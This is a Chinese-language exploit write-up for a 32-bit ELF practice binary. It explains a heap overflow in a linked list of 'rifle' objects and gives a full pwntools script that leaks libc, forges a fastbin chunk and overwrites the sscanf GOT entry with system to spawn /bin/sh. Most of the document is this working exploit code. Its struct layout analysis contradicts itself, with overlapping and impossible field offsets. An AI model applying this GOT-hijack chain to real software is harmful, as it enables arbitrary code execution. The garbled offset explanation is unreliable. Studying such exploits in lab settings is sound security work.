# 漏洞利用文档

## 执行环境
基于反编译代码和exp调试信息分析，程序的执行环境如下：
- **二进制类型**：32位ELF程序，使用x86架构编译
- **保护机制**：从地址固定（0x8048000）和GOT可写判断，程序未启用PIE（Position Independent Executable），且可能未启用Full RELRO，允许GOT表修改
- **内存布局**：程序基址0x8048000，堆区域通常位于0x970d000-0x972e000，libc基址通过泄露确定为0xf7de9000
- **依赖库**：依赖标准C库（libc），具体版本通过泄露的地址可查询
- **运行要求**：需要在Linux环境下运行，exp使用pwntools框架，依赖python3及相关库

## 漏洞成因
### 关键结构体分析
程序使用链表结构管理rifle对象，每个rifle分配0x38字节（56字节）堆块，内存布局如下：
```c
struct rifle {
    char description[56];    // 偏移0-55
    char name[56];          // 偏移25-80（实际溢出）
    struct rifle *next;     // 偏移52-55（13*4字节）
};
```
在函数`sub_8048644`中：
- `malloc(0x38u)`分配56字节堆块
- `fgets(dword_804A288 + 25, 56, stdin)`读取name字段，从偏移25开始写入56字节
- 但堆块总大小仅56字节，name字段写入时从偏移25开始，实际可写入56字节，导致覆盖偏移52-55处的链表指针

### 漏洞类型：堆溢出（Heap Overflow）
- **根本原因**：name字段输入未正确验证长度，56字节写入从偏移25开始，覆盖了相邻的链表指针
- **触发条件**：当用户选择"Add new rifle"并输入长name时，溢出发生
- **影响**：通过精心构造的name数据，可覆盖链表指针，实现任意地址读/写

## Exploit
完整的漏洞利用脚本，在关键位置添加注释说明：

```python
from pwn import *
from LibcSearcher import *

# 设置调试环境
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/sample18')
p = process('./data/sample18')
libc = elf.libc

def addRifle(name, desc):
    p.sendline(b'1')
    p.sendline(name)
    p.sendline(desc)

def leakLibc():
    p.sendline(b'2')
    print(p.recvuntil(b'Description: '))
    print(p.recvuntil(b'Description: '))
    leak = p.recvline()
    puts = u32(leak[0:4])  # 从泄露数据解析puts地址
    libc_base = puts - libc.symbols['puts']  # 计算libc基址
    return libc_base

def orderRifles():
    p.sendline(b'3')

def leaveMessage(content):
    p.sendline(b'4')
    p.sendline(content)

def addRifles(count):
    for i in range(count):
        addRifle(b'1'*0x1b + p32(0x0), b'1593')
        orderRifles()

# Step 1: 堆溢出设置 - 覆盖链表指针为GOT地址
addRifle(b'0'*0x1b + p32(elf.got['puts']), b'15935728')

# Step 2: 泄露libc地址 - 通过遍历链表读取GOT表
libc_base = leakLibc()
system = libc_base + libc.symbols['system']  # 计算system函数地址

# Step 3: 大量分配释放堆块 - 准备fastbin状态
addRifles(0x3f)

# Step 4: 构造链表 - 覆盖链表指针指向消息缓冲区
addRifle(b'1'*0x1b + p32(0x804a2a8), b'15935728')

# Step 5: 伪造堆块大小 - 在消息缓冲区写入0x81绕过堆检查
leaveMessage(p32(0)*9 + p32(0x81))

# Step 6: 释放堆块 - 触发fastbin操作
orderRifles()

# Step 7: 设置GOT覆盖目标 - 将消息缓冲区指向sscanf的GOT条目
addRifle(b'15935728', p32(elf.got['__isoc99_sscanf']))

# Step 8: 覆盖GOT条目 - 将sscanf替换为system函数
leaveMessage(p32(system))

# Step 9: 触发代码执行 - 输入/bin/sh参数给system
p.sendline(b'/bin/sh')

# 获得交互式shell
p.interactive()
```

### 关键注释说明
- **堆溢出利用**：在Step 1中，name字段输入27个字节后接GOT地址，覆盖偏移52字节处的链表指针
- **信息泄露**：Step 2通过遍历链表读取GOT表中的puts地址，计算libc基址
- **链表构造**：Step 4和Step 7精心构造链表结构，实现从程序数据区到GOT表的控制流
- **GOT劫持**：Step 8将`__isoc99_sscanf`的GOT条目覆盖为system地址，下次调用sscanf时执行system
- **触发机制**：Step 9发送"/bin/sh"字符串，当程序调用sscanf时实际执行system("/bin/sh")

此利用链成功利用了堆溢出漏洞，通过信息泄露、链表操纵和GOT覆盖，最终实现了远程代码执行。
